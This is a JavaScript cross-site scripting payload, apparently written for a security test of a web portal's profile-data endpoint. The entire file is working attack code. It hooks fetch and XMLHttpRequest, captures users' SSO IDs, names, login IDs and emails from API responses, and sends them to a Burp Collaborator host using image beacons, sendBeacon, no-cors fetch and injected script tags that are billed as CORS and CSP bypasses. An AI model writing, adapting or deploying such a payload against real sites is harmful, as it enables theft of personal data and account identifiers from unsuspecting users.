// XSS Payload - Extract API responses with CORS/CSP bypasses
(function() {
  const targetEndpoint = '/portal-profile-service/initNewPortalData';
  const attackerServer = 'https://nh8d7wmgsxld6hcm5ub72ejt0k6bu6iv.oastify.com'; // Your Burp Collab
  
  // Test 1: Log to console to verify XSS executed
  console.log('[PAYLOAD LOADED] XSS is executing!');
  window.xssLoaded = true;
  
  // Test 2: Simple ping to verify callback
  (new Image()).src = attackerServer + '/ping?xss=loaded';
  
  // Method 1: Intercept fetch with CORS bypass using Image beacon
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const url = args[0];
    if (url.includes(targetEndpoint)) {
      console.log('[FETCH INTERCEPTED]', url);
      return originalFetch.apply(this, args).then(response => {
        const clonedResponse = response.clone();
        clonedResponse.json().then(data => {
          console.log('[DATA CAPTURED]', data);
          exfiltrateData(data);
        }).catch(e => console.log('[JSON PARSE ERROR]', e));
        return response;
      }).catch(e => {
        console.log('[FETCH ERROR]', e);
      });
    }
    return originalFetch.apply(this, args);
  };
  
  // Method 2: XMLHttpRequest interception
  const originalXHR = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url, ...rest) {
    if (url.includes(targetEndpoint)) {
      console.log('[XHR INTERCEPTED]', method, url);
      const originalOnReadyStateChange = this.onreadystatechange;
      this.onreadystatechange = function() {
        if (this.readyState === 4) {
          try {
            const responseData = JSON.parse(this.responseText);
            console.log('[XHR DATA CAPTURED]', responseData);
            exfiltrateData(responseData);
          } catch(e) {
            console.log('[XHR PARSE ERROR]', e);
          }
          if (originalOnReadyStateChange) originalOnReadyStateChange.call(this);
        }
      };
    }
    return originalXHR.apply(this, [method, url, ...rest]);
  };
  
  // Exfiltration methods - try multiple approaches
  function exfiltrateData(data) {
    const extractedData = {
      user: data.user ? {
        ssoId: data.user.ssoId,
        lastName: data.user.lastName,
        loginId: data.user.loginId,
        displayName: data.user.displayName,
        userId: data.user.userId,
        firstName: data.user.firstName,
        email: data.user.email,
        userType: data.user.userType
      } : null,
      timestamp: new Date().toISOString(),
      source: window.location.href
    };
    
    // Method A: Image beacon (bypasses CORS, reliable)
    try {
      const img = new Image();
      img.src = attackerServer + '/img?data=' + encodeURIComponent(JSON.stringify(extractedData));
      console.log('[EXFIL] Image beacon sent');
    } catch(e) { console.log('[IMG ERROR]', e); }
    
    // Method B: Sendbeacon (reliable, fires before navigation)
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(attackerServer + '/beacon', JSON.stringify(extractedData));
        console.log('[EXFIL] Sendbeacon sent');
      }
    } catch(e) { console.log('[BEACON ERROR]', e); }
    
    // Method C: Fetch without CORS (might work with credentials)
    try {
      fetch(attackerServer + '/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(extractedData),
        mode: 'no-cors'  // Important: no-cors bypasses CORS in some cases
      }).then(r => console.log('[EXFIL] Fetch sent')).catch(e => console.log('[FETCH EXFIL ERROR]', e));
    } catch(e) { console.log('[FETCH SEND ERROR]', e); }
    
    // Method D: Script tag injection (can work past CSP in some cases)
    try {
      const script = document.createElement('script');
      script.src = attackerServer + '/script?data=' + encodeURIComponent(JSON.stringify(extractedData));
      document.body.appendChild(script);
      console.log('[EXFIL] Script tag injected');
    } catch(e) { console.log('[SCRIPT ERROR]', e); }
    
    // Method E: Store in window object for manual inspection
    window.capturedData = extractedData;
    console.log('[DATA STORED] window.capturedData =', extractedData);
  }
  
  // Method 3: Monitor all fetch calls (catch anything)
  const OriginalRequest = window.XMLHttpRequest || XMLHttpRequest;
  if (OriginalRequest) {
    window.XMLHttpRequest = class extends OriginalRequest {
      send(data) {
        console.log('[ALL XHR SEND]', this.method, this.responseURL || this.url);
        return super.send(data);
      }
    };
  }
  
  console.log('[READY] Waiting for API calls...');
  
})();
